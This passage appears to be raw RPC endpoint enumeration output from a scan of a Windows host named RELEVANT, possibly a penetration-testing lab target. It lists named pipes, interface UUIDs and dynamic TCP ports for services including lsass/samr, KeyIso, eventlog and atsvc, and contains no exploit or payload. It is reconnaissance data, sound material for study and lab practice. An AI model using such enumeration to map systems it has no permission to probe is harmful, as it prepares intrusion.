|     ncalrpc: LRPC-c8ad155a96be6fec85
|     annotation: UserMgrCli
|     uuid: 0d3c7f20-1c8d-4654-a1b3-51563b298bda
|   
|     ncalrpc: OLEBFE1F3A598594A51365C1EFA85E1
|     annotation: IP Transition Configuration endpoint
|     uuid: 552d076a-cb29-4e44-8b6a-d15e59e2c0af
|   
|     ncalrpc: LRPC-483eb1cc6d011a2d23
|     annotation: IP Transition Configuration endpoint
|     uuid: 552d076a-cb29-4e44-8b6a-d15e59e2c0af
|   
|     ncalrpc: IUserProfile2
|     annotation: IP Transition Configuration endpoint
|     uuid: 552d076a-cb29-4e44-8b6a-d15e59e2c0af
|   
|     ncalrpc: senssvc
|     annotation: IP Transition Configuration endpoint
|     uuid: 552d076a-cb29-4e44-8b6a-d15e59e2c0af
|   
|     ncalrpc: SessEnvPrivateRpc
|     annotation: IP Transition Configuration endpoint
|     uuid: 552d076a-cb29-4e44-8b6a-d15e59e2c0af
|   
|     netbios: \\RELEVANT
|     annotation: IP Transition Configuration endpoint
|     uuid: 552d076a-cb29-4e44-8b6a-d15e59e2c0af
|     ncacn_np: \pipe\SessEnvPublicRpc
|   
|     ip_addr: 0.0.0.0
|     annotation: IP Transition Configuration endpoint
|     uuid: 552d076a-cb29-4e44-8b6a-d15e59e2c0af
|     tcp_port: 49667
|   
|     netbios: \\RELEVANT
|     annotation: IP Transition Configuration endpoint
|     uuid: 552d076a-cb29-4e44-8b6a-d15e59e2c0af
|     ncacn_np: \PIPE\atsvc
|   
|     ncalrpc: ubpmtaskhostchannel
|     annotation: IP Transition Configuration endpoint
|     uuid: 552d076a-cb29-4e44-8b6a-d15e59e2c0af
|   
|     ncalrpc: DeviceSetupManager
|     annotation: IP Transition Configuration endpoint
|     uuid: 552d076a-cb29-4e44-8b6a-d15e59e2c0af
|   
|     ncalrpc: LRPC-a80ac9a09405818e3f
|     annotation: IP Transition Configuration endpoint
|     uuid: 552d076a-cb29-4e44-8b6a-d15e59e2c0af
|   
|     ncalrpc: LRPC-c8ad155a96be6fec85
|     annotation: IP Transition Configuration endpoint
|     uuid: 552d076a-cb29-4e44-8b6a-d15e59e2c0af
|   
|     ncalrpc: OLEBFE1F3A598594A51365C1EFA85E1
|     annotation: Proxy Manager provider server endpoint
|     uuid: 2e6035b2-e8f1-41a7-a044-656b439c4c34
|   
|     ncalrpc: LRPC-483eb1cc6d011a2d23
|     annotation: Proxy Manager provider server endpoint
|     uuid: 2e6035b2-e8f1-41a7-a044-656b439c4c34
|   
|     ncalrpc: IUserProfile2
|     annotation: Proxy Manager provider server endpoint
|     uuid: 2e6035b2-e8f1-41a7-a044-656b439c4c34
|   
|     ncalrpc: senssvc
|     annotation: Proxy Manager provider server endpoint
|     uuid: 2e6035b2-e8f1-41a7-a044-656b439c4c34
|   
|     ncalrpc: SessEnvPrivateRpc
|     annotation: Proxy Manager provider server endpoint
|     uuid: 2e6035b2-e8f1-41a7-a044-656b439c4c34
|   
|     netbios: \\RELEVANT
|     annotation: Proxy Manager provider server endpoint
|     uuid: 2e6035b2-e8f1-41a7-a044-656b439c4c34
|     ncacn_np: \pipe\SessEnvPublicRpc
|   
|     ip_addr: 0.0.0.0
|     annotation: Proxy Manager provider server endpoint
|     uuid: 2e6035b2-e8f1-41a7-a044-656b439c4c34
|     tcp_port: 49667
|   
|     netbios: \\RELEVANT
|     annotation: Proxy Manager provider server endpoint
|     uuid: 2e6035b2-e8f1-41a7-a044-656b439c4c34
|     ncacn_np: \PIPE\atsvc
|   
|     ncalrpc: ubpmtaskhostchannel
|     annotation: Proxy Manager provider server endpoint
|     uuid: 2e6035b2-e8f1-41a7-a044-656b439c4c34
|   
|     ncalrpc: DeviceSetupManager
|     annotation: Proxy Manager provider server endpoint
|     uuid: 2e6035b2-e8f1-41a7-a044-656b439c4c34
|   
|     ncalrpc: LRPC-a80ac9a09405818e3f
|     annotation: Proxy Manager provider server endpoint
|     uuid: 2e6035b2-e8f1-41a7-a044-656b439c4c34
|   
|     ncalrpc: LRPC-c8ad155a96be6fec85
|     annotation: Proxy Manager provider server endpoint
|     uuid: 2e6035b2-e8f1-41a7-a044-656b439c4c34
|   
|     ncalrpc: OLEBFE1F3A598594A51365C1EFA85E1
|     annotation: Proxy Manager client server endpoint
|     uuid: c36be077-e14b-4fe9-8abc-e856ef4f048b
|   
|     ncalrpc: LRPC-483eb1cc6d011a2d23
|     annotation: Proxy Manager client server endpoint
|     uuid: c36be077-e14b-4fe9-8abc-e856ef4f048b
|   
|     ncalrpc: IUserProfile2
|     annotation: Proxy Manager client server endpoint
|     uuid: c36be077-e14b-4fe9-8abc-e856ef4f048b
|   
|     ncalrpc: senssvc
|     annotation: Proxy Manager client server endpoint
|     uuid: c36be077-e14b-4fe9-8abc-e856ef4f048b
|   
|     ncalrpc: SessEnvPrivateRpc
|     annotation: Proxy Manager client server endpoint
|     uuid: c36be077-e14b-4fe9-8abc-e856ef4f048b
|   
|     netbios: \\RELEVANT
|     annotation: Proxy Manager client server endpoint
|     uuid: c36be077-e14b-4fe9-8abc-e856ef4f048b
|     ncacn_np: \pipe\SessEnvPublicRpc
|   
|     ip_addr: 0.0.0.0
|     annotation: Proxy Manager client server endpoint
|     uuid: c36be077-e14b-4fe9-8abc-e856ef4f048b
|     tcp_port: 49667
|   
|     netbios: \\RELEVANT
|     annotation: Proxy Manager client server endpoint
|     uuid: c36be077-e14b-4fe9-8abc-e856ef4f048b
|     ncacn_np: \PIPE\atsvc
|   
|     ncalrpc: ubpmtaskhostchannel
|     annotation: Proxy Manager client server endpoint
|     uuid: c36be077-e14b-4fe9-8abc-e856ef4f048b
|   
|     ncalrpc: DeviceSetupManager
|     annotation: Proxy Manager client server endpoint
|     uuid: c36be077-e14b-4fe9-8abc-e856ef4f048b
|   
|     ncalrpc: LRPC-a80ac9a09405818e3f
|     annotation: Proxy Manager client server endpoint
|     uuid: c36be077-e14b-4fe9-8abc-e856ef4f048b
|   
|     ncalrpc: LRPC-c8ad155a96be6fec85
|     annotation: Proxy Manager client server endpoint
|     uuid: c36be077-e14b-4fe9-8abc-e856ef4f048b
|   
|     ncalrpc: OLEBFE1F3A598594A51365C1EFA85E1
|     annotation: Adh APIs
|     uuid: c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1
|   
|     ncalrpc: LRPC-483eb1cc6d011a2d23
|     annotation: Adh APIs
|     uuid: c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1
|   
|     ncalrpc: IUserProfile2
|     annotation: Adh APIs
|     uuid: c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1
|   
|     ncalrpc: senssvc
|     annotation: Adh APIs
|     uuid: c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1
|   
|     ncalrpc: SessEnvPrivateRpc
|     annotation: Adh APIs
|     uuid: c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1
|   
|     netbios: \\RELEVANT
|     annotation: Adh APIs
|     uuid: c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1
|     ncacn_np: \pipe\SessEnvPublicRpc
|   
|     ip_addr: 0.0.0.0
|     annotation: Adh APIs
|     uuid: c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1
|     tcp_port: 49667
|   
|     netbios: \\RELEVANT
|     annotation: Adh APIs
|     uuid: c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1
|     ncacn_np: \PIPE\atsvc
|   
|     ncalrpc: ubpmtaskhostchannel
|     annotation: Adh APIs
|     uuid: c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1
|   
|     ncalrpc: DeviceSetupManager
|     annotation: Adh APIs
|     uuid: c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1
|   
|     ncalrpc: LRPC-a80ac9a09405818e3f
|     annotation: Adh APIs
|     uuid: c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1
|   
|     ncalrpc: LRPC-c8ad155a96be6fec85
|     annotation: Adh APIs
|     uuid: c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1
|   
|     ncalrpc: LRPC-2bc0da235a6ffc022f
|     annotation: LiveIdSvc RPC Interface
|     uuid: cc105610-da03-467e-bc73-5b9e2937458d
|   
|     ncalrpc: LRPC-2bc0da235a6ffc022f
|     annotation: OnlineProviderCert RPC Interface
|     uuid: faf2447b-b348-4feb-8dbe-beee5b7f7778
|   
|     ncalrpc: liveidsvcnotify
|     annotation: LiveIdSvcNotify RPC Interface
|     uuid: 572e35b4-1344-4565-96a1-f5df3bfa89bb
|   
|     ncalrpc: LRPC-adfbeff232d3168076
|     annotation: NSI server endpoint
|     uuid: 7ea70bcf-48af-4f6a-8968-6a440754d5fa
|   
|     ncalrpc: LRPC-adfbeff232d3168076
|     annotation: WinHttp Auto-Proxy Service
|     uuid: 3473dd4d-2e88-4006-9cba-22570909dd10
|   
|     ncalrpc: OLE3CAD2C9AD26D8695B24F09837BC5
|     annotation: WinHttp Auto-Proxy Service
|     uuid: 3473dd4d-2e88-4006-9cba-22570909dd10
|   
|     ncalrpc: LicenseServiceEndpoint
|     annotation: LicenseManager
|     uuid: a4b8d482-80ce-40d6-934d-b22a01a44fe7
|   
|     ncalrpc: LRPC-c9c0a1f563f94e309d
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|   
|     ncalrpc: LRPC-c9c0a1f563f94e309d
|     annotation: Network Connection Broker server endpoint for NCB Reset module
|     uuid: 5222821f-d5e2-4885-84f1-5f6185a0ec41
|   
|     ncalrpc: LRPC-7d57ea6fc86f9cfa50
|     annotation: Network Connection Broker server endpoint for NCB Reset module
|     uuid: 5222821f-d5e2-4885-84f1-5f6185a0ec41
|   
|     ncalrpc: LRPC-c9c0a1f563f94e309d
|     annotation: KAPI Service endpoint
|     uuid: 880fd55e-43b9-11e0-b1a8-cf4edfd72085
|   
|     ncalrpc: LRPC-7d57ea6fc86f9cfa50
|     annotation: KAPI Service endpoint
|     uuid: 880fd55e-43b9-11e0-b1a8-cf4edfd72085
|   
|     ncalrpc: OLE0255F3C782AC67F486346BFFEB70
|     annotation: KAPI Service endpoint
|     uuid: 880fd55e-43b9-11e0-b1a8-cf4edfd72085
|   
|     ncalrpc: TSUMRPD_PRINT_DRV_LPC_API
|     annotation: KAPI Service endpoint
|     uuid: 880fd55e-43b9-11e0-b1a8-cf4edfd72085
|   
|     ncalrpc: LRPC-5ecba0a300c19aa993
|     annotation: KAPI Service endpoint
|     uuid: 880fd55e-43b9-11e0-b1a8-cf4edfd72085
|   
|     ncalrpc: LRPC-c9c0a1f563f94e309d
|     annotation: Network Connection Broker server endpoint
|     uuid: e40f7b57-7a25-4cd3-a135-7f7d3df9d16b
|   
|     ncalrpc: LRPC-7d57ea6fc86f9cfa50
|     annotation: Network Connection Broker server endpoint
|     uuid: e40f7b57-7a25-4cd3-a135-7f7d3df9d16b
|   
|     ncalrpc: OLE0255F3C782AC67F486346BFFEB70
|     annotation: Network Connection Broker server endpoint
|     uuid: e40f7b57-7a25-4cd3-a135-7f7d3df9d16b
|   
|     ncalrpc: TSUMRPD_PRINT_DRV_LPC_API
|     annotation: Network Connection Broker server endpoint
|     uuid: e40f7b57-7a25-4cd3-a135-7f7d3df9d16b
|   
|     ncalrpc: LRPC-5ecba0a300c19aa993
|     annotation: Network Connection Broker server endpoint
|     uuid: e40f7b57-7a25-4cd3-a135-7f7d3df9d16b
|   
|     ncalrpc: LRPC-c9c0a1f563f94e309d
|     annotation: PcaSvc
|     uuid: 0767a036-0d22-48aa-ba69-b619480f38cb
|   
|     ncalrpc: LRPC-7d57ea6fc86f9cfa50
|     annotation: PcaSvc
|     uuid: 0767a036-0d22-48aa-ba69-b619480f38cb
|   
|     ncalrpc: OLE0255F3C782AC67F486346BFFEB70
|     annotation: PcaSvc
|     uuid: 0767a036-0d22-48aa-ba69-b619480f38cb
|   
|     ncalrpc: TSUMRPD_PRINT_DRV_LPC_API
|     annotation: PcaSvc
|     uuid: 0767a036-0d22-48aa-ba69-b619480f38cb
|   
|     ncalrpc: LRPC-5ecba0a300c19aa993
|     annotation: PcaSvc
|     uuid: 0767a036-0d22-48aa-ba69-b619480f38cb
|   
|     ncalrpc: LRPC-8f914f68b7c2e566ce
|     annotation: NRP server endpoint
|     uuid: 30adc50c-5cbc-46ce-9a0e-91914789e23c
|   
|     ncalrpc: LRPC-8f914f68b7c2e566ce
|     annotation: Event log TCPIP
|     uuid: f6beaff7-1e19-4fbb-9f8f-b89e2018337c
|   
|     ncalrpc: eventlog
|     annotation: Event log TCPIP
|     uuid: f6beaff7-1e19-4fbb-9f8f-b89e2018337c
|   
|     netbios: \\RELEVANT
|     annotation: Event log TCPIP
|     uuid: f6beaff7-1e19-4fbb-9f8f-b89e2018337c
|     ncacn_np: \pipe\eventlog
|   
|     ip_addr: 0.0.0.0
|     annotation: Event log TCPIP
|     uuid: f6beaff7-1e19-4fbb-9f8f-b89e2018337c
|     tcp_port: 49666
|   
|     ncalrpc: LRPC-8f914f68b7c2e566ce
|     annotation: DHCPv6 Client LRPC Endpoint
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6
|   
|     ncalrpc: eventlog
|     annotation: DHCPv6 Client LRPC Endpoint
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6
|   
|     netbios: \\RELEVANT
|     annotation: DHCPv6 Client LRPC Endpoint
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6
|     ncacn_np: \pipe\eventlog
|   
|     ip_addr: 0.0.0.0
|     annotation: DHCPv6 Client LRPC Endpoint
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6
|     tcp_port: 49666
|   
|     ncalrpc: dhcpcsvc6
|     annotation: DHCPv6 Client LRPC Endpoint
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6
|   
|     ncalrpc: LRPC-8f914f68b7c2e566ce
|     annotation: DHCP Client LRPC Endpoint
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5
|   
|     ncalrpc: eventlog
|     annotation: DHCP Client LRPC Endpoint
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5
|   
|     netbios: \\RELEVANT
|     annotation: DHCP Client LRPC Endpoint
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5
|     ncacn_np: \pipe\eventlog
|   
|     ip_addr: 0.0.0.0
|     annotation: DHCP Client LRPC Endpoint
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5
|     tcp_port: 49666
|   
|     ncalrpc: dhcpcsvc6
|     annotation: DHCP Client LRPC Endpoint
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5
|   
|     ncalrpc: dhcpcsvc
|     annotation: DHCP Client LRPC Endpoint
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5
|   
|     ncalrpc: LRPC-8f914f68b7c2e566ce
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|   
|     ncalrpc: eventlog
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|   
|     netbios: \\RELEVANT
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|     ncacn_np: \pipe\eventlog
|   
|     ip_addr: 0.0.0.0
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|     tcp_port: 49666
|   
|     ncalrpc: dhcpcsvc6
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|   
|     ncalrpc: dhcpcsvc
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|   
|     ncalrpc: LRPC-1dc16482fae5173d44
|     uuid: d09bdeb5-6171-4a34-bfe2-06fa82652568
|   
|     ncalrpc: LRPC-8f914f68b7c2e566ce
|     uuid: a500d4c6-0dd1-4543-bc0c-d5f93486eaf8
|   
|     ncalrpc: eventlog
|     uuid: a500d4c6-0dd1-4543-bc0c-d5f93486eaf8
|   
|     netbios: \\RELEVANT
|     uuid: a500d4c6-0dd1-4543-bc0c-d5f93486eaf8
|     ncacn_np: \pipe\eventlog
|   
|     ip_addr: 0.0.0.0
|     uuid: a500d4c6-0dd1-4543-bc0c-d5f93486eaf8
|     tcp_port: 49666
|   
|     ncalrpc: dhcpcsvc6
|     uuid: a500d4c6-0dd1-4543-bc0c-d5f93486eaf8
|   
|     ncalrpc: dhcpcsvc
|     uuid: a500d4c6-0dd1-4543-bc0c-d5f93486eaf8
|   
|     ncalrpc: LRPC-1dc16482fae5173d44
|     uuid: a500d4c6-0dd1-4543-bc0c-d5f93486eaf8
|   
|     ncalrpc: LRPC-8bb18c2f0268d6d052
|     uuid: a500d4c6-0dd1-4543-bc0c-d5f93486eaf8
|   
|     ncalrpc: LRPC-ba9c485f541f4f5681
|     annotation: WM_WindowManagerRPC\Server
|     uuid: df4df73a-c52d-4e3a-8003-8437fdf8302a
|   
|     ncalrpc: LRPC-ba9c485f541f4f5681
|     annotation: Base Firewall Engine API
|     uuid: dd490425-5325-4565-b774-7e27d6c09c24
|   
|     ncalrpc: LRPC-db2f5da17dd4473c9a
|     annotation: Base Firewall Engine API
|     uuid: dd490425-5325-4565-b774-7e27d6c09c24
|   
|     ncalrpc: LRPC-ba9c485f541f4f5681
|     annotation: Fw APIs
|     uuid: 7f9d11bf-7fb9-436b-a812-b2d50c5d4c03
|   
|     ncalrpc: LRPC-db2f5da17dd4473c9a
|     annotation: Fw APIs
|     uuid: 7f9d11bf-7fb9-436b-a812-b2d50c5d4c03
|   
|     ncalrpc: LRPC-e8015d867b71f5f174
|     annotation: Fw APIs
|     uuid: 7f9d11bf-7fb9-436b-a812-b2d50c5d4c03
|   
|     ncalrpc: LRPC-ba9c485f541f4f5681
|     annotation: Fw APIs
|     uuid: f47433c3-3e9d-4157-aad4-83aa1f5c2d4c
|   
|     ncalrpc: LRPC-db2f5da17dd4473c9a
|     annotation: Fw APIs
|     uuid: f47433c3-3e9d-4157-aad4-83aa1f5c2d4c
|   
|     ncalrpc: LRPC-e8015d867b71f5f174
|     annotation: Fw APIs
|     uuid: f47433c3-3e9d-4157-aad4-83aa1f5c2d4c
|   
|     ncalrpc: LRPC-ba9c485f541f4f5681
|     annotation: Fw APIs
|     uuid: 2fb92682-6599-42dc-ae13-bd2ca89bd11c
|   
|     ncalrpc: LRPC-db2f5da17dd4473c9a
|     annotation: Fw APIs
|     uuid: 2fb92682-6599-42dc-ae13-bd2ca89bd11c
|   
|     ncalrpc: LRPC-e8015d867b71f5f174
|     annotation: Fw APIs
|     uuid: 2fb92682-6599-42dc-ae13-bd2ca89bd11c
|   
|     exe: lsass.exe samr interface
|     netbios: \\RELEVANT
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|     ncacn_np: \pipe\lsass
|   
|     exe: lsass.exe samr interface
|     ncalrpc: audit
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|   
|     exe: lsass.exe samr interface
|     ncalrpc: securityevent
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|   
|     exe: lsass.exe samr interface
|     ncalrpc: LSARPC_ENDPOINT
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|   
|     exe: lsass.exe samr interface
|     ncalrpc: lsacap
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|   
|     exe: lsass.exe samr interface
|     ncalrpc: LSA_IDPEXT_ENDPOINT
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|   
|     exe: lsass.exe samr interface
|     ncalrpc: LSA_EAS_ENDPOINT
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|   
|     exe: lsass.exe samr interface
|     ncalrpc: lsapolicylookup
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|   
|     exe: lsass.exe samr interface
|     ncalrpc: lsasspirpc
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|   
|     exe: lsass.exe samr interface
|     ncalrpc: protected_storage
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|   
|     exe: lsass.exe samr interface
|     ncalrpc: SidKey Local End Point
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|   
|     exe: lsass.exe samr interface
|     ncalrpc: samss lpc
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|   
|     exe: lsass.exe samr interface
|     ip_addr: 0.0.0.0
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|     tcp_port: 49665
|   
|     netbios: \\RELEVANT
|     annotation: KeyIso
|     uuid: b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86
|     ncacn_np: \pipe\lsass
|   
|     ncalrpc: audit
|     annotation: KeyIso
|     uuid: b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86
|   
|     ncalrpc: securityevent
|     annotation: KeyIso
|     uuid: b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86
|   
|     ncalrpc: LSARPC_ENDPOINT
|     annotation: KeyIso
|     uuid: b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86
|   
|     ncalrpc: lsacap
|     annotation: KeyIso
|     uuid: b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86
|   
|     ncalrpc: LSA_IDPEXT_ENDPOINT
|     annotation: KeyIso
|     uuid: b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86
|   
|     ncalrpc: LSA_EAS_ENDPOINT
|     annotation: KeyIso
|     uuid: b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86
|   
|     ncalrpc: lsapolicylookup
|     annotation: KeyIso
|     uuid: b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86
|   
|     ncalrpc: lsasspirpc
|     annotation: KeyIso
|     uuid: b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86
|   
|     ncalrpc: protected_storage
|     annotation: KeyIso
|     uuid: b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86
|   
|     ncalrpc: SidKey Local End Point
|     annotation: KeyIso
|     uuid: b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86
|   
|     ncalrpc: samss lpc
|     annotation: KeyIso
|     uuid: b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86
|   
|     ip_addr: 0.0.0.0
|     annotation: KeyIso
|     uuid: b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86
|     tcp_port: 49665
|   
|     netbios: \\RELEVANT
|     annotation: Ngc Pop Key Service
|     uuid: 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b
|     ncacn_np: \pipe\lsass
|   
|     ncalrpc: audit
|     annotation: Ngc Pop Key Service
|     uuid: 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b
|   
|     ncalrpc: securityevent
|     annotation: Ngc Pop Key Service
|     uuid: 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b
|   
|     ncalrpc: LSARPC_ENDPOINT
|     annotation: Ngc Pop Key Service
|     uuid: 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b
|   
|     ncalrpc: lsacap
|     annotation: Ngc Pop Key Service
|     uuid: 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b
|   
|     ncalrpc: LSA_IDPEXT_ENDPOINT
|     annotation: Ngc Pop Key Service
|     uuid: 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b
|   
|     ncalrpc: LSA_EAS_ENDPOINT
|     annotation: Ngc Pop Key Service
|     uuid: 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b
|   
|     ncalrpc: lsapolicylookup
|     annotation: Ngc Pop Key Service
|     uuid: 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b
|   
|     ncalrpc: lsasspirpc
|     annotation: Ngc Pop Key Service
|     uuid: 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b
|   
|     ncalrpc: protected_storage
|     annotation: Ngc Pop Key Service
|     uuid: 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b
|   
|     ncalrpc: SidKey Local End Point
|     annotation: Ngc Pop Key Service
|     uuid: 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b
|   
|     ncalrpc: samss lpc
|     annotation: Ngc Pop Key Service
|     uuid: 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b
|   
|     ip_addr: 0.0.0.0
|     annotation: Ngc Pop Key Service
|     uuid: 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b
|     tcp_port: 49665
|   
|     netbios: \\RELEVANT
|     annotation: Ngc Pop Key Service
|     uuid: 51a227ae-825b-41f2-b4a9-1ac9557a1018
|     ncacn_np: \pipe\lsass
|   
|     ncalrpc: audit
|     annotation: Ngc Pop Key Service
|     uuid: 51a227ae-825b-41f2-b4a9-1ac9557a1018
|   
|     ncalrpc: securityevent
|     annotation: Ngc Pop Key Service
|     uuid: 51a227ae-825b-41f2-b4a9-1ac9557a1018
|   
|     ncalrpc: LSARPC_ENDPOINT
|     annotation: Ngc Pop Key Service
|     uuid: 51a227ae-825b-41f2-b4a9-1ac9557a1018
|   
|     ncalrpc: lsacap
|     annotation: Ngc Pop Key Service
|     uuid: 51a227ae-825b-41f2-b4a9-1ac9557a1018
|   
|     ncalrpc: LSA_IDPEXT_ENDPOINT
|     annotation: Ngc Pop Key Service
|     uuid: 51a227ae-825b-41f2-b4a9-1ac9557a1018
|   
|     ncalrpc: LSA_EAS_ENDPOINT
|     annotation: Ngc Pop Key Service
|     uuid: 51a227ae-825b-41f2-b4a9-1ac9557a1018
|   
|     ncalrpc: lsapolicylookup
|     annotation: Ngc Pop Key Service
|     uuid: 51a227ae-825b-41f2-b4a9-1ac9557a1018
|   
|     ncalrpc: lsasspirpc
|     annotation: Ngc Pop Key Service
|     uuid: 51a227ae-825b-41f2-b4a9-1ac9557a1018
|   
|     ncalrpc: protected_storage
|     annotation: Ngc Pop Key Service
|     uuid: 51a227ae-825b-41f2-b4a9-1ac9557a1018
|   
|     ncalrpc: SidKey Local End Point
|     annotation: Ngc Pop Key Service
|     uuid: 51a227ae-825b-41f2-b4a9-1ac9557a1018
|   
|     ncalrpc: samss lpc
|     annotation: Ngc Pop Key Service
|     uuid: 51a227ae-825b-41f2-b4a9-1ac9557a1018
|   
|     ip_addr: 0.0.0.0
|     annotation: Ngc Pop Key Service
|     uuid: 51a227ae-825b-41f2-b4a9-1ac9557a1018
|     tcp_port: 49665
|   
|     ncalrpc: umpo
|     uuid: 4bec6bb8-b5c2-4b6f-b2c1-5da5cf92d0d9
|   
|     ncalrpc: actkernel
|     uuid: 4bec6bb8-b5c2-4b6f-b2c1-5da5cf92d0d9
|   
|     ncalrpc: umpo
|     uuid: 085b0334-e454-4d91-9b8c-4134f9e793f3
|   
|     ncalrpc: actkernel
|     uuid: 085b0334-e454-4d91-9b8c-4134f9e793f3
|   
|     ncalrpc: umpo
|     uuid: 8782d3b9-ebbd-4644-a3d8-e8725381919b
|   
|     ncalrpc: actkernel
|     uuid: 8782d3b9-ebbd-4644-a3d8-e8725381919b
|   
|     ncalrpc: umpo
|     uuid: 3b338d89-6cfa-44b8-847e-531531bc9992
|   
|     ncalrpc: actkernel
|     uuid: 3b338d89-6cfa-44b8-847e-531531bc9992
|   
|     ncalrpc: umpo
|     uuid: bdaa0970-413b-4a3e-9e5d-f6dc9d7e0760
|   
|     ncalrpc: actkernel
|     uuid: bdaa0970-413b-4a3e-9e5d-f6dc9d7e0760
|   
|     ncalrpc: umpo
|     uuid: 5824833b-3c1a-4ad2-bdfd-c31d19e23ed2
|   
|     ncalrpc: actkernel
|     uuid: 5824833b-3c1a-4ad2-bdfd-c31d19e23ed2
|   
|     ncalrpc: umpo
|     annotation: Impl friendly name
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|   
|     ncalrpc: actkernel
|     annotation: Impl friendly name
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|   
|     ncalrpc: LRPC-73ff82e907f8d542ac
|     annotation: Impl friendly name
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|   
|     ncalrpc: umpo
|     uuid: 2d98a740-581d-41b9-aa0d-a88b9d5ce938
|   
|     ncalrpc: actkernel
|     uuid: 2d98a740-581d-41b9-aa0d-a88b9d5ce938
|   
|     ncalrpc: LRPC-73ff82e907f8d542ac
|     uuid: 2d98a740-581d-41b9-aa0d-a88b9d5ce938
|   
|     ncalrpc: LSMApi
|     uuid: 2d98a740-581d-41b9-aa0d-a88b9d5ce938
|   
|     netbios: \\RELEVANT
|     uuid: 2d98a740-581d-41b9-aa0d-a88b9d5ce938
|     ncacn_np: \pipe\LSM_API_service
|   
|     ncalrpc: umpo
|     uuid: 8bfc3be1-6def-4e2d-af74-7c47cd0ade4a
|   
|     ncalrpc: actkernel
|     uuid: 8bfc3be1-6def-4e2d-af74-7c47cd0ade4a
|   
|     ncalrpc: LRPC-73ff82e907f8d542ac
|     uuid: 8bfc3be1-6def-4e2d-af74-7c47cd0ade4a
|   
|     ncalrpc: LSMApi
|     uuid: 8bfc3be1-6def-4e2d-af74-7c47cd0ade4a
|   
|     netbios: \\RELEVANT
|     uuid: 8bfc3be1-6def-4e2d-af74-7c47cd0ade4a
|     ncacn_np: \pipe\LSM_API_service
|   
|     ncalrpc: umpo
|     uuid: 1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0
|   
|     ncalrpc: actkernel
|     uuid: 1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0
|   
|     ncalrpc: LRPC-73ff82e907f8d542ac
|     uuid: 1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0
|   
|     ncalrpc: LSMApi
|     uuid: 1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0
|   
|     netbios: \\RELEVANT
|     uuid: 1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0
|     ncacn_np: \pipe\LSM_API_service
|   
|     ncalrpc: umpo
|     uuid: c605f9fb-f0a3-4e2a-a073-73560f8d9e3e
|   
